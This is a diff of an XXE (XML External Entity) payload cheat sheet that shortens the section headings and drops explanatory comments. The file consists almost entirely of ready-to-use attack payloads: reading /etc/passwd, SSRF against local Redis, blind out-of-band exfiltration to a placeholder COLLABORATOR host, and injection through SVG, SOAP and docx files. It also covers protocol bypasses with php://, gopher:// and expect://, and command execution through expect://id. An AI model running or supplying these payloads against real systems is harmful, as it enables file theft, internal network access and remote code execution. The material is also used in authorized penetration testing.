@@ -1,7 +1,5 @@
 # ============================================================
 # XXE — XML External Entity Injection
-# Use: Burp Repeater, manual injection in XML/SOAP/SVG/docx
-# Context: Content-Type: application/xml, text/xml, multipart
 # ============================================================
 
 # ---- Basic File Read (Linux) ----
@@ -63,17 +61,11 @@
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
 <root>&xxe;</root>
 
-# ---- Blind XXE — OOB via DTD (replace COLLABORATOR) ----
+# ---- Blind XXE — OOB ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe.dtd"> %xxe;]>
 <root>&exfil;</root>
 
-# xxe.dtd hosted on your server:
-# <!ENTITY % file SYSTEM "file:///etc/passwd">
-# <!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://COLLABORATOR/?data=%file;'>">
-# %wrap;
-
-# ---- Blind XXE — OOB via Parameter Entity ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -82,7 +74,7 @@
 ]>
 <root/>
 
-# ---- Error-Based XXE (trigger parse error with data) ----
+# ---- Error-Based XXE ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -91,19 +83,19 @@
   %error;
 ]>
 
-# ---- XXE via XInclude ----
+# ---- XInclude ----
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
 
-# ---- XXE in SVG Upload ----
+# ---- SVG ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <svg xmlns="http://www.w3.org/2000/svg">
   <text>&xxe;</text>
 </svg>
 
-# ---- XXE in SOAP ----
+# ---- SOAP ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
@@ -112,26 +104,19 @@
   </soap:Body>
 </soap:Envelope>
 
-# ---- XXE in Office Documents (docx/xlsx) ----
-# Unzip the docx, inject into word/document.xml:
+# ---- Office ----
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR/xxe">]>
 <w:document>&xxe;</w:document>
 
-# ---- Bypass DOCTYPE Filters ----
-# Using SYSTEM with different protocols
+# ---- Protocol Bypass ----
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY xxe SYSTEM "gopher://localhost:6379/_INFO%0d%0a">
 <!ENTITY xxe SYSTEM "expect://id">
 <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
 <!ENTITY xxe SYSTEM "jar:file:///var/app/app.jar!/META-INF/MANIFEST.MF">
 
-# ---- Encoding Bypass ----
-# UTF-16 encoded XXE (some parsers accept alternate encoding)
-# Hex: FF FE 3C 00 3F 00...
-# Try Content-Type: application/xml; charset=utf-16
-
-# ---- PHP-Specific ----
+# ---- PHP ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
 <root>&xxe;</root>
@@ -140,7 +125,7 @@
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">]>
 <root>&xxe;</root>
 
-# ---- XXE — RCE via expect:// (PHP, if enabled) ----
+# ---- RCE (if enabled) ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
 <root>&xxe;</root>
